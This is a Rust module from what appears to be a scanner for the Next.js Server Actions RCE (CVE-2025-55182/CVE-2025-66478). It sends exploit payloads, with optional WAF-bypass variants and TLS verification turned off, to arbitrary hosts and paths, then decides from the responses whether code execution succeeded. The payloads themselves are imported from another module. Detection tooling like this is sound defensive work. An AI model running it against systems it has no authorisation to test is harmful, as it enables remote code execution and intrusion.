use crate::detection::{is_vulnerable_rce_check, is_vulnerable_safe_check};
use crate::payload::{build_rce_payload, build_safe_payload, build_vercel_waf_bypass_payload};
use crate::types::{ScanConfig, ScanError, ScanResult};
use reqwest::Client;
use std::collections::HashMap;
use std::time::Duration;
use url::Url;

/// Default headers for the vulnerability check
fn build_default_headers(content_type: &str) -> HashMap<String, String> {
    let mut headers = HashMap::new();
    headers.insert(
        "User-Agent".to_string(),
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0".to_string(),
    );
    headers.insert("Next-Action".to_string(), "x".to_string());
    headers.insert("X-Nextjs-Request-Id".to_string(), "b5dce965".to_string());
    headers.insert("Content-Type".to_string(), content_type.to_string());
    headers.insert(
        "X-Nextjs-Html-Request-Id".to_string(),
        "SSTMXm7OJ_g0Ncx6jpQt9".to_string(),
    );
    headers
}

/// Normalize host to include scheme if missing
pub fn normalize_host(host: &str) -> String {
    let host = host.trim();
    if host.is_empty() {
        return String::new();
    }

    let host = if !host.starts_with("http://") && !host.starts_with("https://") {
        format!("https://{}", host)
    } else {
        host.to_string()
    };

    host.trim_end_matches('/').to_string()
}

/// Build HTTP client with configuration
pub fn build_client(config: &ScanConfig) -> Result<Client, ScanError> {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(config.timeout_secs))
        .redirect(reqwest::redirect::Policy::none()); // Manual redirect handling

    if !config.verify_ssl {
        builder = builder.danger_accept_invalid_certs(true);
    }

    if let Some(proxy_url) = &config.proxy {
        let proxy = reqwest::Proxy::all(proxy_url)
            .map_err(|e| ScanError::RequestFailed(format!("Invalid proxy URL: {}", e)))?;
        builder = builder.proxy(proxy);
    }

    builder
        .build()
        .map_err(|e| ScanError::RequestFailed(e.to_string()))
}

/// Follow redirects only if they stay on the same host
pub async fn resolve_redirects(
    client: &Client,
    url: &str,
    timeout_secs: u64,
    max_redirects: usize,
) -> String {
    let original_host = Url::parse(url)
        .ok()
        .and_then(|u| u.host_str().map(|s| s.to_string()));

    let mut current_url = url.to_string();

    for _ in 0..max_redirects {
        let response = match client
            .head(&current_url)
            .timeout(Duration::from_secs(timeout_secs))
            .send()
            .await
        {
            Ok(r) => r,
            Err(_) => break,
        };

        let status = response.status().as_u16();
        if ![301, 302, 303, 307, 308].contains(&status) {
            break;
        }

        let location = match response.headers().get("location") {
            Some(loc) => match loc.to_str() {
                Ok(s) => s.to_string(),
                Err(_) => break,
            },
            None => break,
        };

        if location.starts_with('/') {
            // Relative redirect - reconstruct URL
            if let Ok(base) = Url::parse(&current_url) {
                current_url = format!(
                    "{}://{}{}",
                    base.scheme(),
                    base.host_str().unwrap_or(""),
                    location
                );
            }
        } else {
            // Absolute redirect - check same host
            if let Ok(new_url) = Url::parse(&location) {
                let new_host = new_url.host_str().map(|s| s.to_string());
                if new_host == original_host {
                    current_url = location;
                } else {
                    break; // Cross-origin, stop
                }
            } else {
                break;
            }
        }
    }

    current_url
}

/// Send the exploit payload to a URL
async fn send_payload(
    client: &Client,
    url: &str,
    headers: &HashMap<String, String>,
    body: &str,
    timeout_secs: u64,
) -> Result<reqwest::Response, ScanError> {
    let mut request = client
        .post(url)
        .timeout(Duration::from_secs(timeout_secs))
        .body(body.to_string());

    for (key, value) in headers {
        request = request.header(key.as_str(), value.as_str());
    }

    request.send().await.map_err(|e| {
        if e.is_timeout() {
            ScanError::Timeout
        } else if e.is_connect() {
            ScanError::ConnectionError(e.to_string())
        } else if e.to_string().to_lowercase().contains("ssl")
            || e.to_string().to_lowercase().contains("certificate")
        {
            ScanError::SslError(e.to_string())
        } else {
            ScanError::RequestFailed(e.to_string())
        }
    })
}

/// Build raw request string for logging
fn build_request_str(url: &str, headers: &HashMap<String, String>, body: &str) -> String {
    let parsed = Url::parse(url).ok();
    let path = parsed
        .as_ref()
        .map(|u| u.path())
        .unwrap_or("/");
    let host = parsed.as_ref().and_then(|u| u.host_str()).unwrap_or("");

    let mut req_str = format!("POST {} HTTP/1.1\r\nHost: {}\r\n", path, host);
    for (k, v) in headers {
        req_str.push_str(&format!("{}: {}\r\n", k, v));
    }
    req_str.push_str(&format!("Content-Length: {}\r\n\r\n", body.len()));
    req_str.push_str(body);
    req_str
}

/// Build raw response string for logging
fn build_response_str(status: u16, headers: &reqwest::header::HeaderMap, body: &str) -> String {
    let mut resp_str = format!("HTTP/1.1 {}\r\n", status);
    for (k, v) in headers {
        if let Ok(v_str) = v.to_str() {
            resp_str.push_str(&format!("{}: {}\r\n", k, v_str));
        }
    }
    // Cap body at 2000 chars like Python
    let body_truncated = if body.len() > 2000 {
        &body[..2000]
    } else {
        body
    };
    resp_str.push_str(&format!("\r\n{}", body_truncated));
    resp_str
}

/// Check if a host is vulnerable to CVE-2025-55182/CVE-2025-66478
pub async fn check_vulnerability(host: &str, config: &ScanConfig) -> ScanResult {
    let mut result = ScanResult::new(host);

    // Normalize host
    let host = normalize_host(host);
    if host.is_empty() {
        result.error = Some("Invalid or empty host".to_string());
        return result;
    }

    // Determine which paths to test
    let test_paths = config
        .paths
        .clone()
        .unwrap_or_else(|| vec!["/".to_string()]);

    // Select payload and detection function based on config
    let (body, content_type) = if config.safe_check {
        build_safe_payload()
    } else if config.vercel_waf_bypass {
        build_vercel_waf_bypass_payload()
    } else {
        build_rce_payload(config.windows, config.waf_bypass, config.waf_bypass_size_kb)
    };

    // Build headers
    let mut headers = build_default_headers(content_type);

    // Apply custom headers (override defaults)
    for (k, v) in &config.custom_headers {
        headers.insert(k.clone(), v.clone());
    }

    // Build client
    let client = match build_client(config) {
        Ok(c) => c,
        Err(e) => {
            result.error = Some(e.to_string());
            return result;
        }
    };

    // Test each path
    for (idx, path) in test_paths.iter().enumerate() {
        // Ensure path starts with /
        let path = if path.starts_with('/') {
            path.clone()
        } else {
            format!("/{}", path)
        };

        let test_url = format!("{}{}", host, path);

        result.tested_url = Some(test_url.clone());
        result.final_url = Some(test_url.clone());
        result.request = Some(build_request_str(&test_url, &headers, &body));

        match send_payload(&client, &test_url, &headers, &body, config.timeout_secs).await {
            Ok(response) => {
                let status = response.status().as_u16();
                result.status_code = Some(status);

                let response_headers = response.headers().clone();
                let body_text = response.text().await.unwrap_or_default();

                result.response = Some(build_response_str(status, &response_headers, &body_text));

                // Check for HTTP error codes that indicate we couldn't properly test
                if status == 404 || status == 429 || status == 403 || status >= 500 {
                    result.error = Some(format!("HTTP {}", status));
                    // Continue to next path if there are more
                    if idx < test_paths.len() - 1 {
                        continue;
                    }
                    return result;
                }

                let is_vuln = if config.safe_check {
                    is_vulnerable_safe_check(status, &body_text, &response_headers)
                } else {
                    is_vulnerable_rce_check(&response_headers)
                };

                if is_vuln {
                    result.vulnerable = Some(true);
                    return result;
                }

                // Try redirect path if enabled
                if config.follow_redirects {
                    let redirect_url =
                        resolve_redirects(&client, &test_url, config.timeout_secs, 10).await;

                    if redirect_url != test_url {
                        // Different path, test it
                        match send_payload(
                            &client,
                            &redirect_url,
                            &headers,
                            &body,
                            config.timeout_secs,
                        )
                        .await
                        {
                            Ok(response) => {
                                let status = response.status().as_u16();
                                let response_headers = response.headers().clone();
                                let body_text = response.text().await.unwrap_or_default();

                                result.final_url = Some(redirect_url.clone());
                                result.request =
                                    Some(build_request_str(&redirect_url, &headers, &body));
                                result.status_code = Some(status);
                                result.response = Some(build_response_str(
                                    status,
                                    &response_headers,
                                    &body_text,
                                ));

                                let is_vuln = if config.safe_check {
                                    is_vulnerable_safe_check(status, &body_text, &response_headers)
                                } else {
                                    is_vulnerable_rce_check(&response_headers)
                                };

                                if is_vuln {
                                    result.vulnerable = Some(true);
                                    return result;
                                }
                            }
                            Err(_) => {
                                // Continue to next path if redirect resolution fails
                            }
                        }
                    }
                }
            }
            Err(ScanError::Timeout) if !config.safe_check => {
                // In RCE mode, timeouts indicate not vulnerable (patched servers hang)
                result.vulnerable = Some(false);
                result.error = Some("Request timed out".to_string());
                // Continue to next path if there are more
                if idx < test_paths.len() - 1 {
                    continue;
                }
                return result;
            }
            Err(e) => {
                // For other errors, continue to next path unless it's the last one
                if idx < test_paths.len() - 1 {
                    continue;
                }
                result.error = Some(e.to_string());
                return result;
            }
        }
    }

    // All paths tested, not vulnerable
    result.vulnerable = Some(false);
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_normalize_host_adds_https() {
        assert_eq!(normalize_host("example.com"), "https://example.com");
    }

    #[test]
    fn test_normalize_host_preserves_http() {
        assert_eq!(normalize_host("http://example.com"), "http://example.com");
    }

    #[test]
    fn test_normalize_host_strips_trailing_slash() {
        assert_eq!(
            normalize_host("https://example.com/"),
            "https://example.com"
        );
    }

    #[test]
    fn test_normalize_host_empty() {
        assert_eq!(normalize_host(""), "");
        assert_eq!(normalize_host("   "), "");
    }
}
